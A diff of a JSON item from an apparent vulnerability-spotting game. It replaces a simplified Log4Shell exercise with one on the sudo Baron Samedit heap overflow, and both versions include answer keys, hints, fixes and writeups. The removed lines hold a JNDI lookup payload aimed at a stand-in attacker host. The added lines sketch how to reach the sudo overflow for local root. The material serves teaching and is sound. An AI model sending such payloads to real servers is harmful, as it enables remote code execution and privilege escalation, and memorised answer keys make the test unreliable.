@@ -1,55 +1,60 @@
 {
-  "id": "srd-0012",
+  "id": "srd-0015",
   "date": "2026-10-13",
   "difficulty": "hard",
-  "language": "java",
+  "language": "c",
   "estimatedMinutes": 30,
   "snippet": {
     "files": [
       {
-        "name": "LogRequest.java",
-        "code": "// Simplified from Apache Log4j2 message formatting, pre-2.15.\npublic void logRequest(HttpServletRequest req) {\n    String ua = req.getHeader(\"User-Agent\");\n    logger.info(\"request from {} ua={}\", req.getRemoteAddr(), ua);\n}\n\n// Inside the logging pipeline, the formatted message is scanned for\n// ${...} expressions and each is resolved by a lookup (jndi, env, ...).\nstatic String render(String formatted) {\n    return StrSubstitutor.replace(formatted);   // expands ${jndi:...}\n}",
+        "name": "set_cmnd.c",
+        "code": "/* Simplified from sudo set_cmnd() argument handling, pre-patch. */\nfor (size = 0, av = argv + 1; *av; av++)\n    size += strlen(*av) + 1;\nuser_args = malloc(size);\n\nfor (to = user_args, av = argv + 1; (from = *av); av++) {\n    while (*from) {\n        if (from[0] == '\\\\' && !isspace((unsigned char)from[1]))\n            from++;                 /* skip the escaping backslash */\n        *to++ = *from++;            /* copy the next character */\n    }\n    *to++ = ' ';\n}",
         "notes": {
-          "3": "Reads the client-supplied User-Agent header.",
-          "4": "Logs it. The `{}` placeholders are replaced with the address and the User-Agent.",
-          "7": "After the message is assembled, the pipeline scans the final text for `${...}` expressions.",
-          "9": "Helper that performs that expansion.",
-          "10": "Resolves each `${...}` via a lookup — including `${jndi:...}`, which reaches out over the network."
+          "2": "First pass: walk the arguments to compute the total length needed.",
+          "3": "Adds each argument's length plus one (for a separator).",
+          "4": "Allocates exactly that many bytes for the concatenated arguments.",
+          "6": "Second pass: copy each argument into the buffer, unescaping as it goes.",
+          "7": "Loop over the characters of the current argument until the NUL.",
+          "8": "If this char is a backslash and the next is not whitespace, treat it as an escape.",
+          "9": "Skip the backslash so the escaped character is copied literally.",
+          "10": "Copy one character and advance both pointers.",
+          "12": "Write a space after each argument."
         }
       }
     ]
   },
   "stages": {
     "line": {
-      "file": "LogRequest.java",
-      "line": 10,
+      "file": "set_cmnd.c",
+      "line": 8,
       "yellowRadius": 2,
       "maxGuesses": 5
     },
     "bugClass": {
-      "answer": "log-inj",
+      "answer": "buffer-overflow",
       "options": [
-        "log-inj",
-        "code-inj",
-        "insecure-deser",
-        "ssrf",
-        "command-inj",
-        "xxe"
+        "buffer-overflow",
+        "oob-read",
+        "int-overflow",
+        "use-after-free",
+        "sign-confusion",
+        "format-string",
+        "toctou"
       ]
     },
     "why": {
       "answerIndex": 1,
       "options": [
         {
-          "label": "Logging the User-Agent on every request fills the disk, a denial of service",
-          "whyWrong": "Log volume is unrelated; the danger is that the log text is interpreted, not merely stored."
+          "label": "`malloc(size)` is not checked for NULL, so a failed allocation is dereferenced",
+          "whyWrong": "Allocation failure is a separate, lesser issue; the exploited bug is the write past the buffer."
         },
         {
-          "label": "The log message contains attacker text that is interpolated for `${}` lookups, so `${jndi:ldap://attacker/x}` makes the server resolve a remote object and load attacker code"
+          "label": "When an argument ends in a lone backslash, line 8 is true, line 9 skips it, then line 10 copies the terminating NUL and advances past the end — so the inner loop keeps reading and writing attacker bytes beyond `user_args`"
         },
         {
-          "label": "`getRemoteAddr()` can be spoofed via X-Forwarded-For",
-          "whyWrong": "Address spoofing is a different concern and doesn't lead to code execution here."
+          "label": "`isspace()` with a signed char is undefined for negative values",
+          "whyWrong": "The `(unsigned char)` cast already guards that; it is not the root cause here."
         }
       ]
     },
@@ -57,58 +62,53 @@
       "answerIndex": 1,
       "options": [
         {
-          "label": "Strip the substring '${' from the User-Agent before logging",
-          "diff": "-    logger.info(\"request from {} ua={}\", req.getRemoteAddr(), ua);\n+    logger.info(\"request from {} ua={}\", req.getRemoteAddr(), ua.replace(\"${\", \"\"));",
-          "whyWrong": "Obfuscated and nested forms like `${${lower:j}ndi:...}` reconstruct the sequence after naive stripping."
+          "label": "Allocate size * 2 to leave head-room",
+          "diff": "-user_args = malloc(size);\n+user_args = malloc(size * 2);",
+          "whyWrong": "The read/write is unbounded once the loop runs off the string; a bigger buffer only moves the overflow."
         },
         {
-          "label": "Disable message-pattern lookups and remove JNDI resolution (e.g. formatMsgNoLookups / upgrade)",
-          "diff": "-    return StrSubstitutor.replace(formatted);\n+    return formatted; // message lookups disabled; JNDI lookup removed"
+          "label": "Only treat a backslash as an escape when a character actually follows it",
+          "diff": "-        if (from[0] == '\\\\' && !isspace((unsigned char)from[1]))\n+        if (from[0] == '\\\\' && from[1] != '\\0' && !isspace((unsigned char)from[1]))\n             from++;"
         },
         {
-          "label": "HTML-escape the User-Agent before logging",
-          "diff": "-    ... ua);\n+    ... escapeHtml(ua));",
-          "whyWrong": "Wrong context entirely; HTML escaping doesn't stop `${}` lookup interpolation."
-        },
-        {
-          "label": "Log at debug level instead of info",
-          "diff": "-    logger.info(...)\n+    logger.debug(...)",
-          "whyWrong": "The lookup still runs whenever the statement is logged; the level is irrelevant."
+          "label": "Replace the manual loop with strncpy(to, from, size)",
+          "diff": "-    while (*from) { ... }\n+    strncpy(to, from, size);",
+          "whyWrong": "This drops the unescaping entirely and still trusts a length that the escape logic made wrong; it doesn't address the over-read."
         }
       ]
     }
   },
   "source": {
     "origin": "cve",
-    "cve": "CVE-2021-44228",
-    "project": "Apache Log4j2",
-    "advisory": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
-    "license": "Apache-2.0",
-    "attribution": "Apache Log4j2, CVE-2021-44228 (Log4Shell), simplified"
+    "cve": "CVE-2021-3156",
+    "project": "Sudo",
+    "advisory": "https://nvd.nist.gov/vuln/detail/CVE-2021-3156",
+    "license": "ISC",
+    "attribution": "Sudo, CVE-2021-3156 (Baron Samedit), simplified"
   },
   "training": {
-    "exploit": "Send `User-Agent: ${jndi:ldap://attacker.example/a}`. When the line is logged, Log4j interpolates the `${jndi:...}` lookup, connects to the attacker's LDAP server, downloads the referenced Java class, and executes it — unauthenticated remote code execution. Any logged attacker-controlled field (headers, form fields, usernames) is a vector.",
+    "exploit": "Invoke sudo in a mode that reaches this path (e.g. `sudoedit -s`) with an argument ending in a single backslash followed by a long attacker-controlled string. The escape handling walks past the end of the argument and copies attacker bytes beyond `user_args` on the heap, corrupting adjacent allocator metadata — crafted carefully, this yields local root.",
     "concepts": [
-      "CWE-917",
-      "CVE-2021-44228"
+      "CWE-787",
+      "CVE-2021-3156"
     ],
     "hints": {
-      "line": "The dangerous step interprets the log text, not the one that writes it.",
-      "bugClass": "Attacker text in a log message is evaluated as an expression.",
-      "why": "What does a `${jndi:...}` lookup actually do?",
-      "fix": "Stop interpreting log messages as expressions, and remove JNDI."
+      "line": "The copy overflows, but the faulty decision is the escape test above it.",
+      "bugClass": "Memory is written past the end of a heap buffer.",
+      "why": "What happens when `from` points at a backslash that is the last character?",
+      "fix": "Don't treat a trailing backslash as escaping the NUL terminator."
     }
   },
   "writeup": {
-    "summary": "Log4j2 scanned every formatted log message for `${...}` expressions and resolved them via lookups, including `jndi`. Because logged data often includes attacker-controlled fields (here the User-Agent), a value of `${jndi:ldap://attacker/x}` made the server connect to an attacker LDAP/RMI endpoint and load a remote class — remote code execution just by being logged. This is Log4Shell. The real remediation disabled message lookups and removed JNDI resolution; string-stripping defenses were repeatedly bypassed with nested lookups.",
+    "summary": "In shell/edit mode, sudo copied the command line into a heap buffer while unescaping backslashes. The escape test checked `from[1]` without first confirming a character exists: for an argument ending in a lone `\\`, it skipped the backslash and copied the terminating NUL, then the `while (*from)` loop continued reading and writing past the end of the argument — a heap buffer overflow with attacker-controlled contents. Because sudo is setuid root and the path is reachable without a password prompt in that mode, it became a reliable local privilege escalation (Baron Samedit). The fix stops treating a trailing backslash as an escape.",
     "readNext": [
       {
-        "label": "CVE-2021-44228 (NVD)",
-        "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+        "label": "Qualys advisory: Baron Samedit (CVE-2021-3156)",
+        "url": "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"
       },
       {
-        "label": "Apache Log4j Security Advisories",
-        "url": "https://logging.apache.org/log4j/2.x/security.html"
+        "label": "CVE-2021-3156 (NVD)",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"
       }
     ]
   }
